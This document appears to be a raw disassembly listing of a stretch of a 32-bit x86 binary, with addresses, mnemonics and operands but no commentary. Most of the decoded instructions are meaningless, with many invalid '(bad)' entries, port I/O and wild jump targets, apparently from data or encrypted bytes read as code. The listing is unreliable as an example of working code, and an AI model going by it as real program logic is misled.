  4131c1:	arpl   WORD PTR [ecx],bx
  4131c3:	adc    ah,BYTE PTR [edi-0x5]
  4131c6:	sbb    bl,BYTE PTR [ecx]
  4131c8:	call   DWORD PTR [ebx+0x29]
  4131cb:	pop    es
  4131cc:	xor    DWORD PTR ds:0x137d6a39,ebp
  4131d2:	adc    DWORD PTR [esi+ebx*4-0x3e],edx
  4131d6:	(bad)  
  4131d7:	mov    eax,ds:0xbcec6a07
  4131dc:	cwde   
  4131dd:	(bad)  
  4131de:	jbe    0x41317d
  4131e0:	fst    QWORD PTR ds:0x5f4d7e0b
  4131e6:	or     DWORD PTR [ecx],esp
  4131e8:	or     DWORD PTR [ebx-0x73efb311],edi
  4131ee:	or     eax,DWORD PTR [ebx-0x720aea38]
  4131f4:	pop    esp
  4131f5:	pop    esi
  4131f6:	and    ecx,DWORD PTR [eax-0xc78e3c4]
  4131fc:	xchg   ecx,eax
  4131fd:	xor    eax,DWORD PTR [esi-0x2c]
  413200:	jp     0x413238
  413202:	push   ebx
  413203:	mov    BYTE PTR [edx],bl
  413205:	add    DWORD PTR [ebx+0x24ac8bdb],edx
  41320b:	or     eax,0x53f9295
  413210:	fist   WORD PTR [edx]
  413212:	dec    ebx
  413213:	scas   al,BYTE PTR es:[edi]
  413214:	fs pop esi
  413216:	and    ebx,DWORD PTR [ebx-0x80]
  413219:	nop
  41321a:	mov    edi,0x8cf4df6
  41321f:	fstp   DWORD PTR [ecx-0x40]
  413222:	sub    dh,BYTE PTR [edi]
  413224:	stos   BYTE PTR es:[edi],al
  413225:	repz adc DWORD PTR [edi-0x649bdb01],esp
  41322c:	out    0xf6,eax
  41322e:	popf   
  41322f:	mov    al,ds:0xfa3d4f31
  413234:	data16 mov al,0x38
  413237:	into   
  413238:	jae    0x413258
  41323a:	push   cs
  41323b:	pushf  
  41323c:	push   esi
  41323d:	add    eax,0xe5c3bdc2
  413242:	pop    es
  413243:	xor    edx,edx
  413245:	pop    ecx
  413246:	inc    ebx
  413247:	mov    edx,0x90ca238d
  41324c:	(bad)  
  41324d:	pop    ss
  41324e:	bound  ecx,QWORD PTR [ecx+eiz*8]
  413251:	cmc    
  413252:	scas   al,BYTE PTR es:[edi]
  413253:	mov    esp,0x5379a036
  413258:	jge    0x413290
  41325a:	out    dx,eax
  41325b:	push   edi
  41325c:	test   BYTE PTR [esi+0x77fe32b9],bl
  413262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413263:	add    eax,0x90d735bb
  413268:	jb     0x4132c3
  41326a:	add    esp,eax
  41326c:	mov    ebx,0x28d01677
  413271:	sti    
  413272:	cmp    edx,DWORD PTR fs:[ebx-0x39c5bded]
  413279:	mov    ecx,esi
  41327b:	enter  0xe428,0x98
  41327f:	cmp    al,BYTE PTR ds:0xa912c00b
  413285:	rcr    BYTE PTR [edx-0x9],1
  413288:	push   esi
  413289:	mov    ah,0x9b
  41328b:	fstp   TBYTE PTR [eax]
  41328d:	jns    0x4132bd
  41328f:	xor    DWORD PTR [eax-0x7c8b5ca2],0x15cb2113
  413299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41329a:	mov    ebp,0x31059bf6
  41329f:	call   0xdc545342
  4132a4:	in     eax,0x65
  4132a6:	aam    0xdc
  4132a8:	test   BYTE PTR cs:[edi-0x7e18f01a],ch
  4132af:	add    DWORD PTR [ecx+0x38],eax
  4132b2:	jp     0x41324e
  4132b4:	in     eax,dx
  4132b5:	mov    bl,0xc4
  4132b7:	in     al,dx
  4132b8:	test   eax,0xfe91056
  4132bd:	push   edx
  4132be:	cmc    
  4132bf:	scas   eax,DWORD PTR es:[edi]
  4132c0:	je     0x413313
  4132c2:	les    esp,FWORD PTR [edi+0x4dad463b]
  4132c8:	js     0x413258
  4132ca:	mov    edi,0x1e182705
  4132cf:	lea    ebp,[esi-0x1b]
  4132d2:	xchg   esi,eax
  4132d3:	imul   edx,edx,0xaca55d73
  4132d9:	shr    BYTE PTR [ebx-0x4e],1
  4132dc:	fistp  QWORD PTR [edi-0x51e36ea]
  4132e2:	(bad)  
  4132e3:	jl     0x41327b
  4132e5:	mov    gs,WORD PTR [esi+0x52]
  4132e8:	icebp  
  4132e9:	(bad)  
  4132ea:	stos   BYTE PTR es:[edi],al
  4132eb:	sahf   
  4132ec:	dec    edi
  4132ed:	jle    0x413314
  4132ef:	sbb    DWORD PTR ds:0xcba093bb,0x7ca0a44f
  4132f9:	(bad)  
  4132fa:	mov    esp,0xb9946a12
  4132ff:	cli    
  413300:	dec    ebp
  413301:	xor    DWORD PTR [edx],edi
  413303:	sub    al,0x1c
  413305:	loop   0x413372
  413307:	in     eax,0x88
  413309:	sub    dl,al
  41330b:	aaa    
  41330c:	fistp  WORD PTR [ebp-0x374df058]
  413312:	jne    0x41332e
  413314:	xor    ah,bl
  413316:	sar    BYTE PTR [edx+0x50697c76],0x63
  41331d:	(bad)  
  41331f:	ret    0x4f55
  413322:	repnz and eax,0xc252ff51
  413328:	adc    ah,cl
  41332a:	push   eax
  41332b:	sbb    ebx,DWORD PTR [edi]
  41332d:	fiadd  WORD PTR [eax]
  41332f:	lahf   
  413330:	rol    DWORD PTR [edi],cl
  413332:	sti    
  413333:	popa   
  413334:	ret    
  413335:	out    dx,eax
  413336:	xchg   esp,eax
  413337:	out    0x18,eax
  413339:	shl    dh,1
  41333b:	inc    eax
  41333c:	cmp    dh,BYTE PTR [ebp+0x5c94259b]
  413342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413343:	inc    esi
  413344:	loope  0x413328
  413346:	fwait
  413347:	js     0x4132e9
  413349:	mov    bh,0x1c
  41334b:	ins    BYTE PTR es:[edi],dx
  41334c:	jo     0x4133a6
  41334e:	sbb    DWORD PTR ds:0xb6b5a393,esi
  413354:	ins    BYTE PTR es:[edi],dx
  413355:	js     0x4133c6
  413357:	push   ss
  413358:	in     al,dx
  413359:	enter  0x139c,0x6a
  41335d:	stos   BYTE PTR es:[edi],al
  41335e:	icebp  
  41335f:	inc    ecx
  413360:	or     al,0x76
  413362:	jae    0x4133de
  413364:	mov    BYTE PTR [ebx-0x7e98feab],ah
  41336a:	push   0x3342d8b
  41336f:	xlat   BYTE PTR ds:[ebx]
  413370:	xlat   BYTE PTR ds:[ebx]
  413371:	push   esi
  413372:	and    eax,0xaf3eab31
  413377:	sbb    DWORD PTR [eax+0x20],edi
  41337a:	inc    edi
  41337b:	mov    bh,0x41
  41337d:	nop
  41337e:	jle    0x413380
  413380:	or     BYTE PTR [ecx-0x44],0xe5
  413384:	jno    0x413328
  413386:	push   es
  413387:	and    eax,0x530d6a6b
  41338c:	(bad)  [esi+0x45a478d1]
  413392:	loope  0x41338c
  413394:	pushf  
  413395:	push   es
  413396:	mov    al,ds:0xccbe3a24
  41339b:	or     DWORD PTR [esi+eiz*2],0x963477e5
  4133a2:	lods   al,BYTE PTR ds:[esi]
  4133a3:	dec    ebp
  4133a4:	shl    DWORD PTR [edx+0x68],cl
  4133a7:	jo     0x4133d3
  4133a9:	or     dh,BYTE PTR [ebx]
  4133ab:	popf   
  4133ac:	jne    0x413406
  4133ae:	xor    al,0xbe
  4133b0:	or     al,0xe6
  4133b2:	into   
  4133b3:	inc    edi
  4133b4:	inc    ebx
  4133b5:	mov    ecx,DWORD PTR [ecx]
  4133b7:	mov    ebp,0x3919109d
  4133bc:	sub    BYTE PTR [ebx-0x7a8874a0],al
  4133c2:	mov    cl,0x25
  4133c4:	add    al,0x69
  4133c6:	mov    ch,0xe3
  4133c8:	loopne 0x413369
  4133ca:	jne    0x413364
  4133cc:	adc    BYTE PTR ds:[eax],ch
  4133cf:	adc    al,0xa7
  4133d1:	or     BYTE PTR [eax-0x15],0x62
  4133d5:	lock dec eax
  4133d7:	call   0x1fcd:0x10a37583
  4133de:	jmp    0xbd1ee63c
  4133e3:	jbe    0x4133a3
  4133e5:	lods   eax,DWORD PTR ds:[esi]
  4133e6:	push   ebp
  4133e7:	retf   
  4133e8:	and    bl,cl
  4133ea:	mov    ebx,0xb1d65772
  4133ef:	mov    ch,0xa6
  4133f1:	pop    esi
  4133f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133f3:	arpl   dx,di
  4133f5:	add    DWORD PTR [ecx+esi*8],0xffffff86
  4133f9:	test   DWORD PTR [esi],eax
  4133fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133fc:	push   ecx
  4133fd:	jb     0x4133f8
  4133ff:	push   eax
  413400:	pop    eax
  413401:	sahf   
  413402:	sub    DWORD PTR [edx-0x749216e6],edi
  413408:	pop    ss
  413409:	ins    BYTE PTR es:[edi],dx
  41340a:	ja     0x41345b
  41340c:	ret    0xc737
  41340f:	jno    0x413452
  413411:	repz dec eax
  413413:	in     eax,0x5e
  413415:	shl    BYTE PTR [ebp+0x390a0da6],0xd6
  41341c:	out    dx,eax
  41341d:	pop    ebp
  41341e:	cmp    DWORD PTR [ebp+ebp*1+0x78],0xc88a83f7
  413426:	scas   al,BYTE PTR es:[edi]
  413427:	cdq    
  413428:	xchg   ebx,eax
  413429:	in     al,dx
  41342a:	dec    ebx
  41342b:	mov    dl,0xba
  41342d:	xchg   edx,eax
  41342e:	fwait
  41342f:	adc    eax,0x54a7bdfd
  413434:	stc    
  413435:	jmp    FWORD PTR [ecx-0x2cc8641a]
  41343b:	and    bl,dl
  41343d:	imul   esp,DWORD PTR [edi+0x37ac8e2b],0x199ec03b
  413447:	gs adc eax,0xf074fea1
  41344d:	cmp    al,0xad
  41344f:	or     cl,BYTE PTR [ebx]
  413451:	les    esp,FWORD PTR [eax+0x6b]
  413454:	icebp  
  413455:	add    al,0xd8
  413457:	mul    BYTE PTR [edi+eiz*4]
  41345a:	cmp    al,0x66
  41345c:	mov    ch,0x7f
  41345e:	mov    eax,ds:0x6749130b
  413463:	ds sbb dl,bh
  413466:	jbe    0x41344a
  413468:	ins    BYTE PTR es:[edi],dx
  413469:	add    edx,ebx
  41346b:	out    0x1f,eax
  41346d:	add    BYTE PTR [edx],bh
  41346f:	aas    
  413470:	stos   DWORD PTR es:[edi],eax
  413471:	adc    esp,ebx
  413473:	popf   
  413474:	inc    edx
  413475:	and    DWORD PTR [edx],eax
  413477:	dec    ebx
  413478:	gs mov al,0xb4
  41347b:	ja     0x4134d1
  41347d:	add    eax,0x39d6fa87
  413482:	in     eax,dx
  413483:	cmp    DWORD PTR [ecx+0x390c1e1f],eax
  413489:	lods   eax,DWORD PTR ds:[esi]
  41348a:	pop    es
  41348b:	enter  0x1825,0xbe
  41348f:	push   esp
  413490:	sar    dl,0x5e
  413493:	jbe    0x4134cf
  413495:	sub    al,bh
  413497:	or     ebx,ebx
  413499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41349a:	enter  0x7ea5,0xde
  41349e:	jbe    0x413451
  4134a0:	enter  0x46c6,0x9e
  4134a4:	mov    ebx,0x9573d281
  4134a9:	add    BYTE PTR [eax],al
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x4220ab
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx-0x79f58f61]
  4134d4:	jno    0x413486
  4134d6:	fs inc edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [eax-0x79d0905c],bh
  4134e3:	dec    edx
  4134e4:	and    BYTE PTR [ebx],0x5f
  4134e7:	xlat   BYTE PTR ds:[ebx]
  4134e8:	pop    ebp
  4134e9:	retf   
  4134ea:	leave  
  4134eb:	xchg   ebp,eax
  4134ec:	mov    edx,?
  4134ee:	jo     0x4134ec
  4134f0:	push   edi
  4134f1:	arpl   bp,si
  4134f3:	inc    ecx
  4134f4:	pop    ss
  4134f5:	mov    bh,0x94
  4134f7:	mov    ds:0xdeb8dab6,al
  4134fc:	hlt    
  4134fd:	jge    0x41356e
  4134ff:	mov    bl,0x88
  413501:	add    ch,0xb9
  413504:	sub    al,0x1c
  413506:	ja     0x41348f
  413508:	icebp  
  413509:	pop    ss
  41350a:	mov    dl,0xf7
  41350c:	repnz inc edi
  41350e:	js     0x413550
  413510:	mov    al,0x31
  413512:	or     bh,BYTE PTR [edx]
  413514:	mov    ebp,DWORD PTR [eax]
  413516:	adc    eax,0x934eadda
  41351b:	out    0x34,al
  41351d:	div    al
  41351f:	mov    ch,0xfb
  413521:	mov    edx,0x44c99658
  413526:	cmp    DWORD PTR [edi],0x1c
  413529:	push   esp
  41352a:	or     DWORD PTR [ebp+0x4f],eax
  41352d:	and    ecx,ecx
  41352f:	add    DWORD PTR [ebx],0x68
  413532:	pop    ebx
  413533:	imul   BYTE PTR [eax-0x3c]
  413536:	push   ebp
  413537:	pop    es
  413538:	sub    eax,edi
  41353a:	xor    dl,BYTE PTR [edx]
  41353c:	mov    al,0x44
  41353e:	xor    eax,0xc4646411
  413543:	into   
  413544:	mov    ch,0xb
  413546:	fistp  DWORD PTR [ecx-0xf]
  413549:	pop    edi
  41354a:	cmp    DWORD PTR [edi-0x5f],ebp
  41354d:	dec    ecx
  41354e:	mov    ds:0x8c60a5a3,al
  413553:	adc    al,BYTE PTR [edi-0x4b]
  413556:	mov    DWORD PTR [eax+ebp*4+0x69],esp
  41355a:	jmp    0x59a6:0x976de4b3
  413561:	sub    esi,DWORD PTR [eax-0x14f88a8a]
  413567:	mov    edi,0xeb8c54ed
  41356c:	inc    edx
  41356d:	test   al,0x59
  41356f:	pop    esp
  413570:	xchg   esi,eax
  413571:	aaa    
  413572:	lea    eax,[eax+edx*2-0x45]
  413576:	jmp    0x8e2a45be
  41357b:	je     0x4135ce
  41357d:	mov    ah,BYTE PTR [edi-0x3b]
  413580:	cwde   
  413581:	dec    edx
  413582:	outs   dx,BYTE PTR ds:[esi]
  413583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413584:	into   
  413585:	pop    ss
  413586:	pop    ds
  413587:	push   eax
  413588:	aaa    
  413589:	push   ecx
  41358a:	and    ebp,DWORD PTR [edx]
  41358c:	rcl    BYTE PTR [ecx-0x25],cl
  41358f:	std    
  413590:	ins    BYTE PTR es:[edi],dx
  413591:	cs push ebp
  413593:	pop    ss
  413594:	push   ds
  413595:	add    eax,DWORD PTR [ecx+edi*2-0xac4c467]
  41359c:	mov    eax,0x28cdd972
  4135a1:	aas    
  4135a2:	ret    0xd59a
  4135a5:	xchg   edx,eax
  4135a6:	fisub  DWORD PTR [ecx+0x5cf2cb34]
  4135ac:	push   edx
  4135ad:	gs jge 0x4135e1
  4135b0:	push   ecx
  4135b1:	bound  edx,QWORD PTR [ebp-0x29]
  4135b4:	adc    eax,0xb966616c
  4135b9:	xchg   ebx,eax
  4135ba:	data16 (bad) 
  4135bd:	mov    eax,0x97087db3
  4135c2:	call   0xfb2fa0ab
  4135c7:	jo     0x413610
  4135c9:	mov    ebp,0x623964fb
  4135ce:	test   al,0xbf
  4135d0:	loopne 0x4135a7
  4135d2:	outs   dx,BYTE PTR ds:[esi]
  4135d3:	stc    
  4135d4:	hlt    
  4135d5:	call   0x6f69386
  4135da:	xchg   BYTE PTR [ebx-0x1d0605e2],ch
  4135e0:	bound  ecx,QWORD PTR [ecx-0x39d29d9d]
  4135e6:	in     eax,0xf4
  4135e8:	adc    bh,ch
  4135ea:	call   0xdc65:0x4f9dc27a
  4135f1:	scas   al,BYTE PTR es:[edi]
  4135f2:	call   0x56fdca7e
  4135f7:	and    DWORD PTR [ebx-0x77517efe],esi
  4135fd:	sub    edx,DWORD PTR [ecx+0x2c]
  413600:	(bad)  
  413601:	xor    al,0xbd
  413603:	fmul   QWORD PTR [ecx]
  413605:	(bad)  
  413606:	scas   al,BYTE PTR es:[edi]
  413607:	xchg   DWORD PTR [ecx+ebp*4+0x7a922f20],eax
  41360e:	jge    0x4135f6
  413610:	cli    
  413611:	adc    al,0xaa
  413613:	out    dx,al
  413614:	and    ebp,edi
  413616:	ror    ch,cl
  413618:	lods   eax,DWORD PTR ds:[esi]
  413619:	aaa    
  41361a:	push   0x5
  41361c:	jg     0x4135b5
  41361e:	push   0xffffff99
  413620:	fld    TBYTE PTR [ecx+0x120d6d05]
  413626:	adc    cl,BYTE PTR [ebp-0x48]
  413629:	std    
  41362a:	or     BYTE PTR ds:0xe7d19b50,0xe2
  413631:	or     eax,0x9c45bb3e
  413636:	push   edi
  413637:	mov    ah,0xc9
  413639:	rcr    BYTE PTR [ebp-0x5e5a045b],cl
  41363f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413640:	(bad)  
  413641:	cmovb  ecx,ebp
  413644:	ret    0xbea0
  413647:	sti    
  413648:	push   esp
  413649:	xchg   esi,eax
  41364a:	sbb    BYTE PTR [eax-0x7fd818c1],ah
  413650:	stos   BYTE PTR es:[edi],al
  413651:	shl    BYTE PTR [edx],cl
  413653:	(bad)  
  413654:	cmc    
  413655:	stos   BYTE PTR es:[edi],al
  413656:	fadd   QWORD PTR [edx-0x469d929]
  41365c:	xchg   ecx,eax
  41365d:	dec    eax
  41365e:	(bad)  
  413660:	(bad)  
  413661:	out    dx,eax
  413662:	dec    eax
  413663:	jmp    0x2176:0xea7d544a
  41366a:	mov    dl,0xe5
  41366c:	xor    ebx,DWORD PTR [edx-0x2031b677]
  413672:	mov    ah,0xa5
  413674:	sub    al,0x8e
  413676:	mov    ds,WORD PTR [edi-0x49]
  413679:	mov    ds:0xc074556a,eax
  41367e:	out    0xb8,al
  413680:	xor    BYTE PTR [ebp+0x5aca5c3],dl
  413686:	add    al,0xe6
  413688:	clc    
  413689:	out    0x3c,al
  41368b:	or     ebx,edi
  41368d:	push   ebp
  41368e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41368f:	jp     0x413646
  413691:	setge  BYTE PTR [edx]
  413694:	sbb    bl,BYTE PTR [edx+ecx*8+0x35d8a3ea]
  41369b:	sub    edx,DWORD PTR [edx+0x287be92e]
  4136a1:	mov    BYTE PTR [esi-0x44566a2],cl
  4136a7:	mov    esp,0x50b71716
  4136ac:	pop    edi
  4136ad:	mov    cl,0x7c
  4136af:	mov    dl,0xe6
  4136b1:	push   0xffffffc6
  4136b3:	icebp  
  4136b4:	sbb    BYTE PTR [edi],0xee
  4136b7:	mov    WORD PTR [ebx+0x3bcffbe6],ds
  4136bd:	ror    DWORD PTR [ebp-0x608f980d],1
  4136c3:	jmp    0xdcef85fe
  4136c8:	es in  eax,0x63
  4136cb:	loope  0x4136b4
  4136cd:	in     al,dx
  4136ce:	adc    al,0xf1
  4136d0:	pop    ds
  4136d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136d2:	mov    esp,0x62b986d6
  4136d7:	xchg   esi,eax
  4136d8:	call   0xcb1f:0x473ebdfc
  4136df:	retf   0x9b68
  4136e2:	scas   eax,DWORD PTR es:[edi]
  4136e3:	sbb    BYTE PTR [edi],ch
  4136e5:	fxch   st(6)
  4136e7:	call   DWORD PTR ds:0x70242635
  4136ed:	inc    ebp
  4136ee:	lods   al,BYTE PTR ds:[esi]
  4136ef:	lahf   
  4136f0:	jnp    0x4136bc
  4136f2:	add    DWORD PTR [esi],esi
  4136f4:	dec    ecx
  4136f5:	xor    al,0x5a
  4136f7:	rcl    ebp,cl
  4136f9:	or     edi,DWORD PTR [esi-0x4baa27d7]
  4136ff:	cdq    
  413700:	cdq    
  413701:	adc    eax,DWORD PTR [ebx-0x73]
  413704:	fld    TBYTE PTR [ebp-0x21ffcacd]
  41370a:	mov    BYTE PTR [edx+0x0],cl
  41370d:	mov    ecx,0x12d56c5a
  413712:	adc    ah,BYTE PTR [ebp-0xcc0133f]
  413718:	sbb    BYTE PTR [edi+edi*4],ah
  41371b:	or     esp,DWORD PTR [esi]
  41371d:	pop    ss
  41371e:	cmp    eax,0xff94bb2b
  413723:	xchg   ecx,eax
  413724:	inc    edi
  413725:	ds std 
  413727:	retf   
  413728:	and    dh,bh
  41372a:	out    0xa8,al
  41372c:	adc    BYTE PTR [esi],dl
  41372e:	mov    eax,ds
  413730:	scas   eax,DWORD PTR es:[edi]
  413731:	push   ss
  413732:	push   eax
  413733:	and    eax,ecx
  413735:	stos   DWORD PTR es:[edi],eax
  413736:	sbb    bl,BYTE PTR [esi]
  413738:	mov    ds:0xcb6a7fcb,al
  41373d:	and    BYTE PTR [esi+0xa],bl
  413740:	mov    ds:0xe17da815,al
  413745:	icebp  
  413746:	das    
  413747:	dec    edi
  413748:	aad    0x13
  41374a:	sbb    esi,ecx
  41374c:	lods   al,BYTE PTR ds:[esi]
  41374d:	icebp  
  41374e:	sbb    edx,0x952f2344
  413754:	shl    BYTE PTR [edi-0x5d],cl
  413757:	lock ins DWORD PTR es:[edi],dx
  413759:	cmp    al,0xae
  41375b:	xor    DWORD PTR [edx-0x4c0c63f7],esi
  413761:	dec    esp
  413762:	mov    DWORD PTR [esi+0x1b],ebx
  413765:	inc    edx
  413766:	push   es
  413767:	out    0x6a,al
  413769:	xchg   ecx,eax
  41376a:	adc    eax,0x905a051e
  41376f:	ins    BYTE PTR es:[edi],dx
  413770:	int    0xca
  413772:	jmp    0xef51:0xf21d9a9a
  413779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41377a:	pusha  
  41377b:	inc    esp
  41377c:	jmp    0x413785
  41377e:	cs loopne 0x413762
  413781:	test   BYTE PTR [eax+0xb93c3c],cl
  413787:	sub    DWORD PTR [ecx],eax
  413789:	mov    ds:0x9390afb7,eax
  41378e:	or     eax,0xfa28eb14
  413793:	or     eax,DWORD PTR ds:0x6f7032e6
  413799:	std    
  41379a:	imul   esi,esi,0xd5eef6d3
  4137a0:	ret    
  4137a1:	push   ebx
  4137a2:	push   ecx
  4137a3:	or     BYTE PTR [ebp-0x41],bh
  4137a6:	imul   edi,edx,0x8
  4137a9:	pushf  
  4137aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ab:	pusha  
  4137ac:	jno    0x41373a
  4137ae:	inc    ebx
  4137af:	dec    edx
  4137b0:	mov    ecx,0x44e5a837
  4137b5:	int3   
  4137b6:	mov    esp,0xbc3a11fd
  4137bb:	sar    BYTE PTR [ebx],1
  4137bd:	cli    
  4137be:	inc    eax
  4137bf:	xchg   esi,eax
  4137c0:	pop    ecx
  4137c1:	add    eax,0x1e72811c
  4137c6:	pushf  
  4137c7:	inc    edi
  4137c8:	push   ss
  4137c9:	scas   eax,DWORD PTR es:[edi]
  4137ca:	bound  esp,QWORD PTR [edx+0x18691397]
  4137d0:	xchg   edx,eax
  4137d1:	es popf 
  4137d3:	arpl   bx,dx
  4137d5:	hlt    
  4137d6:	repnz (bad) 
  4137d8:	or     al,0xb0
  4137da:	lods   eax,DWORD PTR ds:[esi]
  4137db:	cmp    esi,esi
  4137dd:	hlt    
  4137de:	xchg   ecx,eax
  4137df:	imul   edi,DWORD PTR [eax-0x26],0xef72994b
  4137e6:	shl    DWORD PTR [eax-0x19],cl
  4137e9:	dec    ecx
  4137ea:	std    
  4137eb:	xlat   BYTE PTR ds:[ebx]
  4137ec:	cmp    BYTE PTR [edx],dl
  4137ee:	loop   0x413820
  4137f0:	lds    ebp,FWORD PTR [edi+0x33c9eaee]
  4137f6:	lahf   
  4137f7:	push   esi
  4137f8:	lea    edx,[ecx-0x3ceeb179]
  4137fe:	and    DWORD PTR [edi+0x5dd39074],edx
  413804:	sub    BYTE PTR [eax+0x1c],0x8
  413808:	shr    DWORD PTR [eax-0x62bee34],1
  41380e:	lods   al,BYTE PTR ds:[esi]
  41380f:	pusha  
  413810:	repz sub DWORD PTR [ebx-0x4014edba],edi
  413817:	aas    
  413818:	in     al,0xc1
  41381a:	dec    ebx
  41381b:	cmp    DWORD PTR [edx-0x57],esi
  41381e:	pop    ds
  41381f:	jg     0x413843
  413821:	cmp    DWORD PTR [esi-0x8bda6cf],ebp
  413827:	outs   dx,DWORD PTR ds:[esi]
  413828:	or     DWORD PTR [ecx+0x7f],eax
  41382b:	xor    dl,BYTE PTR fs:[ebx]
  41382e:	cmp    dh,BYTE PTR [esi]
  413830:	dec    esp
  413831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413832:	arpl   bx,cx
  413834:	pushf  
  413835:	xchg   DWORD PTR [eax+0x78],ebx
  413838:	push   eax
  413839:	xor    edi,ecx
  41383b:	sub    BYTE PTR [eax-0x3cfbbb94],ah
  413841:	push   eax
  413842:	cmp    BYTE PTR ds:0x3a9e54a3,0x42
  413849:	outs   dx,DWORD PTR ds:[esi]
  41384a:	les    edx,FWORD PTR [ecx*2+0x3ff2b820]
  413851:	xor    BYTE PTR [esi-0x53],bl
  413854:	xchg   ecx,eax
  413855:	test   BYTE PTR ss:[ebp-0x63],ch
  413859:	ja     0x413858
  41385b:	jecxz  0x4137dd
  41385d:	dec    edi
  41385e:	inc    ebx
  41385f:	xchg   esi,eax
  413860:	sub    eax,edx
  413862:	cwde   
  413863:	and    eax,DWORD PTR [edi-0x421f76e6]
  413869:	mov    ebx,ebx
  41386b:	xor    edi,DWORD PTR [edi-0x199fd90]
  413871:	mov    al,ds:0xc62a5f8e
  413876:	ret    
  413877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413878:	inc    esp
  413879:	dec    edi
  41387a:	pop    eax
  41387b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41387c:	jnp    0x413831
  41387e:	mov    eax,ds:0xa50465f8
  413883:	out    dx,al
  413884:	xchg   esp,eax
  413885:	sub    al,0xdb
  413887:	jmp    0xdcff4fb4
  41388c:	addr16 or dl,0x6a
  413890:	aaa    
  413891:	inc    esp
  413892:	sbb    al,BYTE PTR [ebx+edi*4-0x53]
  413896:	das    
  413897:	push   eax
  413898:	mov    cl,0x8b
  41389a:	pop    ebp
  41389b:	in     al,0x81
  41389d:	icebp  
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x52],ebp
  4138e5:	jae    0x4138ff
  4138e7:	stos   BYTE PTR es:[edi],al
  4138e8:	idiv   DWORD PTR [edx]
  4138ea:	sbb    BYTE PTR [eax],bl
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    BYTE PTR [ecx],ch
  4138f1:	js     0x4138fd
  4138f3:	sub    eax,edi
  4138f5:	xchg   DWORD PTR [ebx],eax
  4138f7:	enter  0x4a62,0x6a
  4138fb:	out    0x25,al
  4138fd:	and    al,0xb6
  4138ff:	mov    bl,0x37
  413901:	mov    ebx,0xbc6e1d47
  413906:	das    
  413907:	adc    ch,BYTE PTR [esi+edx*8-0x63]
  41390b:	iret   
  41390c:	inc    ebp
  41390d:	mov    al,0x7b
  41390f:	out    dx,al
  413910:	call   0xf77a23a5
  413915:	inc    eax
  413916:	jmp    0x413956
  413918:	test   DWORD PTR [ebp+0x46],edx
  41391b:	xor    DWORD PTR [ecx-0x58],ecx
  41391e:	jne    0x413940
  413920:	out    dx,eax
  413921:	xor    ebp,DWORD PTR [ebp+0x3a930d9b]
  413927:	jbe    0x413970
  413929:	pop    eax
  41392a:	pop    ss
  41392b:	test   BYTE PTR [edi-0x747b5fdd],0xcd
  413932:	(bad)
  413935:	add    BYTE PTR [ebx-0x1d],0x71
  413939:	nop
  41393a:	test   DWORD PTR [edi+edi*8+0x42],0x72dd29ef
  413942:	rcl    DWORD PTR [ecx-0x622ebc5a],cl
  413948:	mov    dl,0x79
  41394a:	dec    eax
  41394b:	inc    ebx
  41394c:	or     dl,cl
  41394e:	xchg   esi,eax
  41394f:	div    ch
  413951:	loope  0x413951
  413953:	ja     0x4138e2
  413955:	pop    edi
  413956:	loopne 0x413978
  413958:	(bad)  
  413959:	es add al,0x6e
  41395c:	jp     0x4138e7
  41395e:	sub    eax,0xebb60464
  413963:	inc    ebp
  413964:	pop    esp
  413965:	pop    es
  413966:	mov    bh,0x8d
  413968:	int    0x5e
  41396a:	int    0x46
  41396c:	sub    edx,DWORD PTR [ebx-0x7]
  41396f:	sbb    BYTE PTR cs:[ecx+0x777d2927],0xf6
  413977:	rcr    DWORD PTR [edx+0x22],1
  41397a:	mov    ebp,cs
  41397c:	adc    DWORD PTR [eax*8+0x1649a353],ebp
  413983:	(bad)  
  413984:	pusha  
  413985:	jp     0x413933
